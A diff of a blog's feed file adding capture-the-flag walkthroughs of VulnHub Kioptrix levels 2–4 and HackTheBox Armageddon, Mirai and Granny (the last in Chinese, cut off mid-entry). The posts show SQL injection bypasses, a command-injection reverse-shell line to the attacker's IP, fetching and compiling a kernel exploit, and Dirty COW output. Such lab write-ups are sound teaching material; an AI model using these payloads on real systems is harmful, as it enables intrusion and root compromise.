@@ -85,11 +85,119 @@
   
   
   <entry>
+    <title>vulnhub_kioptrix_level_3</title>
+    <link href="/2024/07/23/vulnhub_kioptrix_level_3/"/>
+    <url>/2024/07/23/vulnhub_kioptrix_level_3/</url>
+    
+    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-level-3"><a href="#vulnhub-kioptrix-level-3" class="headerlink" title="vulnhub_kioptrix_level_3"></a>vulnhub_kioptrix_level_3</h1><p>Here comes another walkthrough on KIOPTRIX series!</p><p>First off, we ought to modify &#x2F;etc&#x2F;hosts file and add the following line:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.122.14</span> #your target ip  kioptrix3.com<br></code></pre></td></tr></table></figure><p>Let’s start with some routine scan.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">masscan</span> -p1-<span class="hljs-number">65535</span> <span class="hljs-number">192.168.122.14</span> --rate=<span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106151902727.png" alt="image-20231106151902727"></p><p><code>nmap -sC -sS -sV -A -p 22,80 192.168.122.14</code></p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231109085916455.png" alt="image-20231109085916455"></p><p>There’re only two open ports: port 22 and port 80.</p><p>Clearly, it’s evident that we need to focus on HTTP service.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nikto</span> -h <span class="hljs-number">192.168.122.14</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106152403497.png" alt="image-20231106152403497"></p><p>Sevaral results capture my interest which could have vulnerabilities, such as phpmyadmin(MYSQL).</p><p>Access it using firefox and attempt to login by brute force:</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106153305168.png" alt="image-20231106153305168"></p><p>Unfortunately, it doesn’t work.</p><p>For the next step, I intend to directly access http server on port 80:</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106153753112.png" alt="image-20231106153753112"></p><p>At the top of this page, there are three modules that can be observed:HOME, BLOG, and LOGIN.</p><p>After some experimentation, I have discovered a suspicious feature point where there may be a potential vulnerability for SQL injection — — sort.</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106154444619.png" alt="image-20231106154444619"></p><p>Take a look at the url, the param ID interests me.</p><p>Let me perform a simple test by appending a <code>&#39;</code> after the parameter. An error has occurred!</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106155105908.png" alt="image-20231106155105908"></p><p>SQLMAP:</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">sqlmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">u</span> <span class="hljs-string">&quot;http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=size#photos&quot;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">D</span> <span class="hljs-variable">gallery</span> <span class="hljs-operator">-</span><span class="hljs-variable">T</span> <span class="hljs-type">dev_accounts</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-variable">username</span><span class="hljs-operator">,</span><span class="hljs-variable">password</span> <span class="hljs-operator">--</span><span class="hljs-variable">dump</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106155327482.png" alt="image-20231106155327482"></p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106155646715.png" alt="image-20231106155646715"></p><p>So far, I have obtained two accounts which can be successfully used to login using ssh.</p><p>Do you remember the login page on the homepage we haven’t access? Now let’s do it.</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106160547043.png" alt="image-20231106160547043"></p><p>After unsuccessful attempts to access the backend using methods such as sql injection and brute force, I noticed the presence of ‘LotusCms’.</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchsploit LotusCMS</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106161007373.png" alt="image-20231106161007373"></p><p>Download the exp from google and then execute:</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106161303607.png" alt="image-20231106161303607"></p><p>We can also obtain a shell as well, however, the privilege is lower, compared to the previous one.</p><p>An indeed famous vulnerability caught my attention when I finished performing the inspection using linpeas — DIRTY COW.</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106163430745.png" alt="image-20231106163430745"></p><p>I exploited it with firefart’s code.(<a href="https://github.com/firefart/dirtycow">firefart&#x2F;dirtycow: Dirty Cow exploit — CVE-2016–5195 (github.com)</a>)</p><p>Next, let us proceed step by step.</p><p>Compile:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>gcc -pthread dirty.c -o dirty -lcrypt<br>gcc -pthread dirty.c -o dirty -lcrypt<br>www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>ls<br>ls<br>dirty  dirty.c  exp.c  linpeas.sh<br></code></pre></td></tr></table></figure><p>Exploit:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>./dirty firefart<br>./dirty firefart<br>/etc/passwd successfully backed up to /tmp/passwd.bak<br><span class="hljs-title class_">Please</span> enter the new <span class="hljs-symbol">password:</span> firefart<br><span class="hljs-title class_">Complete</span> <span class="hljs-symbol">line:</span><br><span class="hljs-symbol">firefart:</span>fik57D3GJz/<span class="hljs-symbol">tk:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:pwned</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><br><span class="hljs-symbol">mmap:</span> b7fe0000<br></code></pre></td></tr></table></figure><p>Commands displayed above funtions to create a root-level firefart account with password firefart.</p><p>ROOT IT:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/home/www/kioptrix3</span>.com<span class="hljs-variable">$ </span>su firefart<br>su firefart<br><span class="hljs-symbol">Password:</span> firefart<br><br>firefart<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/home/www/kioptrix3</span>.com<span class="hljs-comment"># id</span><br>id<br>uid=<span class="hljs-number">0</span>(firefart) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>vulnhub</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>vulnhub</tag>
+      
+      <tag>walkthrough</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>vulnhub_kioptrix_level_4</title>
+    <link href="/2024/07/23/vulnhub_kioptrix_level_4/"/>
+    <url>/2024/07/23/vulnhub_kioptrix_level_4/</url>
+    
+    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-level-4"><a href="#vulnhub-kioptrix-level-4" class="headerlink" title="vulnhub_kioptrix_level_4"></a>vulnhub_kioptrix_level_4</h1><p>Welcome to the 4th installment of the multi-level KIOPTRIX vulnhub series, and there’s only one box left. Let’s dive into level 4!</p><p>Port scan with masscan:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107133253518.png" alt="image-20231107133253518"></p><p>Service and vul scan for further details:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107133425955.png" alt="image-20231107133425955"></p><p>It is evident that the focus is on the Samba and HTTP service.</p><p>enum4linux:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107133847734.png" alt="image-20231107133847734"></p><p>The tool successfully enumerated several users on the target machine. Take a note for future reference.</p><p>smbclient:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107134155918.png" alt="image-20231107134155918"></p><p>Nothing interesting.</p><p>dirsearch:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107134416174.png" alt="image-20231107134416174"></p><p>I can finally discover something intriguing after inspecting each page carefully.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107134937886.png" alt="image-20231107134937886"></p><p>This page leaked the username john.</p><p>Next step I choose to access the homepage via firefox:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107140316236.png" alt="image-20231107140316236"></p><p>Here comes a classic login panel! Upon seeing this, multi thoughts come to my mind.</p><ul><li>SQLi</li><li>Brute force</li><li>CMS vul</li><li>…</li></ul><p>There’s no exploitable vulnerabilities about LigGoat and I couldn’t access valid accounts with brute force.</p><p>Let’s check if there exists a SQL injection.</p><p>Input a <code>&#39;</code> in both username and password blanks:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107141050500.png" alt="image-20231107141050500"></p><p>An error occurred!</p><p>After further testing, I discovered that the password field is vulnerable to SQL injection. I attempted to access the backend by entering the username “john” and the password <code>’ or 1=1 #</code>or 1&#x3D;1# to validate this issue.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107141341193.png" alt="image-20231107141341193"></p><p>I obtained the password for robert using the same approach.</p><p>john\MyNameIsJohn</p><p>robert\ADGAdsafdfwt4gadfga&#x3D;&#x3D;</p><p>Attempt to login as john using ssh:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107141854112.png" alt="image-20231107141854112"></p><p>The shell I obtained was severely restricted. However, I successfully bypass it using <code>echo os.system(&#39;/bin/bash&#39;)</code> and gained an interactive shell.</p><p>I could switch to robert account with the password obtained above, so I tried <code>sudo -l</code> to access higher privilege, but failed.</p><p>linpeas.sh:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107143910329.png" alt="image-20231107143910329"></p><p>MYSQL!</p><p>I focused on finding leaked creds, and ultimately discovered the MySQL account password in the “checklogin” file.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107142736153.png" alt="image-20231107142736153"></p><p>Once connected to MySQL, I issued a SQL query to determine if UDF was available within MySQL.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107144212528.png" alt="image-20231107144212528"></p><p>Fortunately, it’s available.</p><p>Solutions to gain root privilege I can think of are following:</p><ul><li>add john to admin group</li><li>manipulate the &#x2F;bin&#x2F;sh file</li></ul><p>First way:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107144646517.png" alt="image-20231107144646517"></p><p>it worked!</p><p>Another:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107144733073.png" alt="image-20231107144733073"></p><p>ROOT it!</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>vulnhub</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>vulnhub</tag>
+      
+      <tag>walkthrough</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Vulnhub-Kioptrix_level_2</title>
+    <link href="/2024/07/23/vulnhub_kioptrix_level_2/"/>
+    <url>/2024/07/23/vulnhub_kioptrix_level_2/</url>
+    
+    <content type="html"><![CDATA[<h3 id="Vulnhub-Kioptrix-level-2"><a href="#Vulnhub-Kioptrix-level-2" class="headerlink" title="Vulnhub-Kioptrix_level_2"></a>Vulnhub-Kioptrix_level_2</h3><p>Default network connectivity of this machine is BRIDGE. I prefer using the NAT mode, however, I encountered an issue when attempting to modify the settings: after changing to NAT, upon restarting, it automatically switches back to BRIDGE mode.</p><p>Here are the solutions:</p><ul><li>Remove the network adapter.</li><li>Delete all lines in the vmx file that start with ethernet0.</li><li>Add a network adapter and select NAT mode.</li></ul><p>OK, Let’s begin our journey of penetration test !</p><p>Let us start with port scan and servece detection.</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104001655079.png" alt="image-20231104001655079"></p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104001708692.png" alt="image-20231104001708692"></p><p>What captures my interest most is HTTP service running on port 80. Just move forward and check it with dirsearch and nikto etc.</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104002346009.png" alt="image-20231104002346009"></p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104002355341.png" alt="image-20231104002355341"></p><p>Unfortunately, there is no information available that helps me go ahead.</p><p>So , I seek for the most direct approach and access port 80 by firefox:</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104002812613.png" alt="image-20231104002812613"></p><p>What comes to me firstly and strongly is SQL INJECTION. I tried to fill the blank with <code>admin’ or 1=1 —</code> <code>123456</code>. Unbelievably , I directly accessed the backend , bypassing the limitation of admin panel.</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104003451499.png" alt="image-20231104003451499"></p><p>Following is a classic PING functionality, where command injection comes to mind quite easy.</p><p>When I input 127.0.0.1:</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104092922931.png" alt="image-20231104092922931"></p><p>PING command executed successfully as expected and I received correct response.</p><p>Then I turned to id command:</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104093617893.png" alt="image-20231104093617893"></p><p>Got it! Now we can be sure that command injection can be performed over here. Through the same method we can gain a reverse shell as well by sending a command to create a reverse shell:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>; sh -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.122.111</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>At the same time, I recerved a bash shell successfully on my attack machine:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">──(root㉿kali)-[~/Desktop/vulnhub/kioptrix_2]<br>└─# nc -nlvp 4444<br>listening on [any] 4444 <span class="hljs-built_in">..</span>.<br>connect <span class="hljs-keyword">to</span> [192.168.122.111] <span class="hljs-keyword">from</span> (UNKNOWN) [192.168.122.13] 32789<br>sh: <span class="hljs-literal">no</span> job control <span class="hljs-keyword">in</span> this shell<br>sh-3.00$ id<br><span class="hljs-attribute">uid</span>=48(apache) <span class="hljs-attribute">gid</span>=48(apache) <span class="hljs-attribute">groups</span>=48(apache)<br>sh-3.00$<br></code></pre></td></tr></table></figure><p>The preliminary step I undertake is uploading LINPEAS to seek for potential vulnerabilities that can be exploited.</p><p>We ought to initate a python http server on our machine, and then proceed to download linpeas onto the target machine using the wget command for subsequent execution.</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less">══════════════════════════════╣ <span class="hljs-selector-tag">System</span> <span class="hljs-selector-tag">Information</span> ╠══════════════════════════════                                                                                                                                <br>                              ╚════════════════════╝                                                                                                                                                              <br>╔══════════╣ <span class="hljs-selector-tag">Operative</span> <span class="hljs-selector-tag">system</span><br>╚ <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                </span><br><span class="hljs-selector-tag">Linux</span> <span class="hljs-selector-tag">version</span> <span class="hljs-number">2.6</span><span class="hljs-selector-class">.9-55</span><span class="hljs-selector-class">.EL</span> (mockbuild<span class="hljs-variable">@builder6</span>.centos.org) (gcc version <span class="hljs-number">3.4</span>.<span class="hljs-number">6</span> <span class="hljs-number">20060404</span> (Red Hat <span class="hljs-number">3.4</span>.<span class="hljs-number">6</span>-<span class="hljs-number">8</span>)) <span class="hljs-selector-id">#1</span> <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">May</span> <span class="hljs-number">2</span> <span class="hljs-number">13</span>:<span class="hljs-number">52</span>:<span class="hljs-number">16</span> <span class="hljs-selector-tag">EDT</span> <span class="hljs-number">2007</span>                                                                           <br><span class="hljs-selector-tag">LSB</span> <span class="hljs-selector-tag">Version</span>:    :<span class="hljs-selector-tag">core-3</span><span class="hljs-selector-class">.0-ia32</span>:<span class="hljs-selector-tag">core-3</span><span class="hljs-selector-class">.0-noarch</span>:<span class="hljs-selector-tag">graphics-3</span><span class="hljs-selector-class">.0-ia32</span>:<span class="hljs-selector-tag">graphics-3</span><span class="hljs-selector-class">.0-noarch</span><br><span class="hljs-selector-tag">Distributor</span> <span class="hljs-selector-tag">ID</span>: <span class="hljs-selector-tag">CentOS</span><br><span class="hljs-selector-tag">Description</span>:    <span class="hljs-selector-tag">CentOS</span> <span class="hljs-selector-tag">release</span> <span class="hljs-number">4.5</span> (Final)<br><span class="hljs-selector-tag">Release</span>:        <span class="hljs-number">4.5</span><br><span class="hljs-selector-tag">Codename</span>:       <span class="hljs-selector-tag">Final</span><br></code></pre></td></tr></table></figure><p>Upon inspecting the system information section, it has been determined that the version identified is 2.6.9, specifically CentOS.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(root㉿kali)</span>-[~<span class="hljs-string">/Desktop/vulnhub/kioptrix_2</span>]<br>└─<span class="hljs-comment"># searchsploit centos 2.6.9             </span><br><span class="hljs-params">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="hljs-params">---------------------------------</span><br> Exploit Title                                                                                                                                                                  |  Path<br><span class="hljs-params">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="hljs-params">---------------------------------</span><br>Linux Kernel 2.6 &lt; 2.6.19 <span class="hljs-params">(White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86)</span> - &#x27;ip_append_data<span class="hljs-params">()</span>&#x27; Ring0 Privilege Escalation <span class="hljs-params">(1)</span>                                            | linux_x86/local/9542.c<br><span class="hljs-params">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="hljs-params">---------------------------------</span><br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>Returning to the searchsploit once again, we can easily find an exploit for privilege escalation.</p><p>The final step is uploading the script to the target machine, compiling it, executing it, and then achieving a successful privilege escalation.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">bash-3.00$ wget http:<span class="hljs-string">//192.168.122.111</span><span class="hljs-function">:8080</span>/9542.c -O <span class="hljs-string">/tmp/exp.c</span><br><span class="hljs-params">--01</span><span class="hljs-function">:35</span><span class="hljs-function">:39--</span>  http:<span class="hljs-string">//192.168.122.111</span><span class="hljs-function">:8080</span>/9542.c<br>           =&gt; `<span class="hljs-string">/tmp/exp.c</span>&#x27;<br>Connecting to 192.168.122.111<span class="hljs-function">:8080...</span> connected.<br>HTTP request sent, awaiting response.<span class="hljs-string">..</span> 200 OK<br>Length: 2,535 <span class="hljs-params">(2.5K)</span> [text/x-csrc]<br><br>    0K <span class="hljs-string">..</span>                                                    100%   36.08 MB/s<br><br>01<span class="hljs-function">:35</span><span class="hljs-function">:39</span> <span class="hljs-params">(36.08 MB/s)</span> - `<span class="hljs-string">/tmp/exp.c</span>&#x27; saved [2535/2535]<br><br>bash-3.00$ <span class="hljs-keyword">cd</span> <span class="hljs-string">/tmp</span><br>bash-3.00$ gcc -o exp exp.c &amp;&amp; <span class="hljs-string">./exp</span><br>exp.c<span class="hljs-function">:109</span><span class="hljs-function">:28</span>: warning: no newline at end of file<br>sh: no job control in this shell<br>sh-3.00<span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><p>ROOT IT!</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>vulnhub</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>vulnhub</tag>
+      
+      <tag>walkthrough</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>htb_armageddon</title>
     <link href="/2023/05/06/htb-armageddon/"/>
     <url>/2023/05/06/htb-armageddon/</url>
     
     <content type="html"><![CDATA[<h1 id="htb-armageddon"><a href="#htb-armageddon" class="headerlink" title="htb_armageddon"></a>htb_armageddon</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>nmap扫端口：</p><p><img src="/htb_armageddon/image-20230506152711881.png" alt="image-20230506152711881"></p><p>这里直接扫出来80端口为drupal 7。</p><p>后台目录扫一下：</p><p><img src="/htb_armageddon/image-20230506152900917.png" alt="image-20230506152900917"></p><p>一一访问之后没有发现有用信息，但是在changelog.txt发现了具体版本号：</p><p><img src="/htb_armageddon/image-20230506152942915.png" alt="image-20230506152942915"></p><p>当前drupal版本为7.56.</p><p>火狐访问：</p><p><img src="/htb_armageddon/image-20230506153014238.png" alt="image-20230506153014238"></p><p>这里为登录框，考虑sql注入或者默认密码弱口令等等，但是由于已经框架和版本，先搜索有无对应漏洞。</p><p>searchsploit：</p><p><img src="/htb_armageddon/image-20230506153100443.png" alt="image-20230506153100443"></p><p>前四个都跟版本号对应，但是除了drupaldeggon2 rce，都需要认证，pass。</p><p>考虑利用该RCE漏洞：</p><p><img src="/htb_armageddon/image-20230506153250036.png" alt="image-20230506153250036"></p><p>CVE-2018-7600。去github查找相应poc，直接利用：</p><p><img src="/htb_armageddon/image-20230506153349570.png" alt="image-20230506153349570"></p><p>获得apache的shell。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>搜索得到drupal默认配置文件的路径：</p><p><img src="/htb_armageddon/image-20230506153707967.png" alt="image-20230506153707967"></p><p><img src="/htb_armageddon/image-20230506154003209.png" alt="image-20230506154003209"></p><p>得到数据库的账号密码。</p><p>mysql登录，注意需要使用-e参数执行命令，由于不是完全交互式shell，直接登录会卡死：</p><p><img src="/htb_armageddon/image-20230506154106713.png" alt="image-20230506154106713"></p><p>筛选出pass，加密的密文，接下来考虑解密。</p><p>使用john，失败：</p><p><img src="/htb_armageddon/image-20230506154158571.png" alt="image-20230506154158571"></p><p>使用hashcat爆破，首先选择mode：</p><p><img src="/htb_armageddon/image-20230506154301967.png" alt="image-20230506154301967"></p><p>爆破：<br><code>hashcat -m 7900 pass /usr/share/wordlists/rockyou.txt</code></p><p><img src="/htb_armageddon/image-20230506154328257.png" alt="image-20230506154328257"></p><p>得到密码booboo，22端口开放，直接ssh登录：</p><p><img src="/htb_armageddon/image-20230506154359188.png" alt="image-20230506154359188"></p><p>sudo -l，发现可以sudo直接snap命令。去gtfobins搜索该命令：</p><p><img src="/htb_armageddon/image-20230506154436272.png" alt="image-20230506154436272"></p><p>先在本地kali生成一个.snap文件，再上传到靶机上执行。</p><p>如果kali没有fpm，先安装<code>gem install fpm</code>，接着生成.snap文件，command就是要执行的命令：</p><p><img src="/htb_armageddon/image-20230506154512221.png" alt="image-20230506154512221"></p><p>在靶机上下载该文件，wget失败，因此使用curl保存，再执行提权命令：</p><p><img src="/htb_armageddon/image-20230506154621073.png" alt="image-20230506154621073"></p><p>uid&#x3D;0，root权限。</p><p>修改command为cat &#x2F;root&#x2F;root.txt:</p><p><img src="/htb_armageddon/image-20230506154648840.png" alt="image-20230506154648840"></p><p>执行：</p><p><img src="/htb_armageddon/image-20230506154713102.png" alt="image-20230506154713102"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>htb</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>walkthrough</tag>
+      
+      <tag>htb</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>htb_mirai</title>
+    <link href="/2023/05/06/htb-mirai/"/>
+    <url>/2023/05/06/htb-mirai/</url>
+    
+    <content type="html"><![CDATA[<h1 id="htb-mirai"><a href="#htb-mirai" class="headerlink" title="htb_mirai"></a>htb_mirai</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>nmap扫描：</p><p><img src="/2023/04/27/file-upload/age-20230505211229060.png" alt="image-20230505211229060"></p><p>重点关注80端口和32400的http服务。</p><p>80端口：</p><p><img src="/2023/04/27/file-upload/age-20230506100232470.png" alt="image-20230506100232470"></p><p>空白，查看源代码也没有任何内容。</p><p>目录爆破：</p><p><img src="/2023/04/27/file-upload/age-20230506100934237.png" alt="image-20230506100934237"></p><p>存在admin目录：</p><p><img src="/2023/04/27/file-upload/age-20230506100959978.png" alt="image-20230506100959978"></p><p>在底部可以看到版本信息：</p><p><img src="/2023/04/27/file-upload/age-20230506101533458.png" alt="image-20230506101533458"></p><p>3.1.4，exploitdb搜索一下：</p><p><img src="/2023/04/27/file-upload/age-20230506101602622.png" alt="image-20230506101602622"></p><p>存在rce，但是版本号不对，并且需要认证，pass。</p><p>点击图标：</p><p><img src="/2023/04/27/file-upload/age-20230506101903505.png" alt="image-20230506101903505"></p><p>发现是树莓派，google得到默认账号密码：pi&#x2F;raspberry，尝试登录，失败。</p><p>ssh登录成功：</p><p><img src="/2023/04/27/file-upload/age-20230506102203946.png" alt="image-20230506102203946"></p><p>对于另一个开放的http端口，访问后为一个登录框：</p><p><img src="/2023/04/27/file-upload/age-20230506102444787.png" alt="image-20230506102444787"></p><p>无法注册，登录后各个参数尝试注入，无果，并且会锁登录次数，pass。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>ssh成功后，find查找flag：</p><p><img src="/2023/04/27/file-upload/age-20230506102538831.png" alt="image-20230506102538831"></p><p>sudo -l提权：</p><p><img src="/2023/04/27/file-upload/age-20230506102728212.png" alt="image-20230506102728212"></p><p>查看root.txt，提示：</p><p><img src="/2023/04/27/file-upload/age-20230506102927697.png" alt="image-20230506102927697"></p><p>root在usb里，mount命令结合df命令查看：</p><p><img src="/2023/04/27/file-upload/age-20230506103005719.png" alt="image-20230506103005719"></p><p>进入&#x2F;media&#x2F;usbstick查看：</p><p><img src="/2023/04/27/file-upload/age-20230506103138523.png" alt="image-20230506103138523"></p><p>提示root被删了….，翻&#x2F;dev&#x2F;sdb文件：</p><p><img src="/2023/04/27/file-upload/age-20230506103217232.png" alt="image-20230506103217232"></p>]]></content>
     
     
     <categories>
@@ -166,11 +274,119 @@
   
   
   <entry>
+    <title>htb_granny</title>
+    <link href="/2023/05/04/htb-granny/"/>
+    <url>/2023/05/04/htb-granny/</url>
+    
+    <content type="html"><![CDATA[<h1 id="htb-granny"><a href="#htb-granny" class="headerlink" title="htb_granny"></a>htb_granny</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap扫一下端口：</p><p><img src="/2023/04/27/file-upload/mage-20230504104404836-168316916606612.png" alt="image-20230504104404836"></p><p>发现为IIS 6.0，windows系统：</p><p><img src="/2023/04/27/file-upload/mage-20230504104434854-168316916606713.png" alt="image-20230504104434854"></p><p>并且存在http-webdav。</p><p>上面可以看到支持PUT,MOVE等http方法，很自然想到put一个shell.txt，再通过MOVE来执行。</p><p>curl查看信息：</p><p><img src="/2023/04/27/file-upload/mage-20230504104556287-168316916606714.png" alt="image-20230504104556287"></p><p>asp.net。</p><p>此处可以通过burp，发生PUT请求，上传一个txt文件，再move，也可以直接用工具davtest：</p><p><img src="/2023/04/27/file-upload/mage-20230504104710372-168316916606715.png" alt="image-20230504104710372"></p><p>测试发现可以上传文件。</p><p>msfvenom生成asp马，davtest上传：</p><p><img src="/2023/04/27/file-upload/mage-20230504104759856-168316916606716.png" alt="image-20230504104759856"></p><p><img src="/2023/04/27/file-upload/mage-20230504104809685-168316916606717.png" alt="image-20230504104809685"></p><p>接下来move该文件，davtest工具自带了move参数，但是未能成功利用，改用curl：</p><p><img src="/2023/04/27/file-upload/mage-20230504104913150-168316916606718.png" alt="image-20230504104913150"></p><p>msf开启监听，成功回连：</p><p><img src="/2023/04/27/file-upload/mage-20230504104950240-168316916606719.png" 